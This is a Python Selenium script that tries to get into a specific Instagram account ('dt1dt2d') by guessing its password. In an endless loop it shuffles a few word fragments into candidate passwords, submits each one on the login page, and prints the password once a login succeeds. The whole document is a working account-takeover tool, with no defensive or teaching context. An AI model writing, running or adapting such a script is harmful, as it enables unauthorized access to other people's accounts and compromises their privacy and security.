import random
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# initialize the driver
driver = webdriver.Chrome()

# go to the login page
driver.get("https://www.instagram.com/accounts/login/")

# wait for the username and password fields to load
username_input = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "username")))
password_input = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "password")))

your_username = "dt1dt2d"
username_input.send_keys(your_username)
words = ["Love", "Emiway", "@", "#"]

while True:
    random.shuffle(words)
    your_password =  ''.join(words)
    password_input.clear()
    for i in range(len(your_password)):
        password_input.send_keys(Keys.BACKSPACE)
    password_input.send_keys(your_password)

    # submit the form
    password_input.send_keys(Keys.RETURN)

    # wait for the popups to appear and dismiss them
    try:
        not_now_btn = WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Not Now')]")))
        not_now_btn.click()
    except:
        pass

    try:
        not_now_btn = WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Not Now')]")))
        not_now_btn.click()
    except:
        pass

    # check if login is successful
    try:
        dashboard = WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CLASS_NAME, "Szr5J")))
        print("Login successful! Password: ", your_password)
        break
    except:
        print(f"Login unsuccessful. Trying another password...", your_password)
